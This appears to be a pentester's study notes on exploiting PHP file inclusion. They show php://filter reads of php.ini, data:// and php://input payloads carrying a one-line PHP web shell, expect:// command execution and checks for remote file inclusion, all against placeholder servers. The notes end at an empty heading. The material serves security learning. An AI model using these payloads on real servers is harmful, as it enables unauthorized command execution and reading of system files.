# PHP Wrappers

## Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code..
This wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configuration.
#### Checking PHP Configurations

We can the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache, or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is the installed PHP version.

**Example Scenario:**

We find an app vulnerable to LFI, we try to read the `php.ini` file to check if `allow_url_include` is on:

```sh
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then take the returned Base64 encoded content and decode it, search for `allow_url_include` value:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with `data` wrapper to include external data, including PHP code.

**Example Scenario:**

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now we can *URL-encode* the base64 string and pass it with the `data://text/plain;base64,` data wrapper which has the ability to decode and execute the PHP code

```sh
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```


---

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input in the `input` wrapper as a POST request's data.

So, the vulnerable parameter must accept POST requests for this attack to work.

*Note:* This wrapper also depends on `allow_url_include`

**Example:**

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```


---

## Expect

The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams. `Expect` works very similarly to web shells, but don't need to provide web shells, as it is designed to execute commands.

One caveat is that `expect` is an external wrapper and it needs to be installed and enabled manually on the back-end server. We can check the configuration to check if it's loaded or not on the webserver just like we did to with `allow_url_include`.

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

# Remote File Inclusion (RFI)

If vulnerable function allows to include remote URLs. This allows two main benefits:
1. Enumerating local-only ports and web applications (SSRF)
2. Gaining remote code execution by including a malicious script that we host

The following functions that (if vulnerable) would allow RFI:

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `include`                    |        ✅         |      ✅      |       ✅        |

```ad-info
Almost any RFI vulnerability is also and LFI vulnerability. Howerver, an LFI may not necessarily be an RFI.
```

## Verify RFI

This also requires checking if `allow_url_include` is enabled or not.

The best way to make sure if an LFI is vulnerable to RFI is to **try to include a URL**

```sh
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

```ad-danger
It may not be ideal to include the vulnerable page itself (i.e. index.php) as this may cause recursive inclusion loops and cause a DoS to the back-end server
```

## Remote Code Execution with RFI

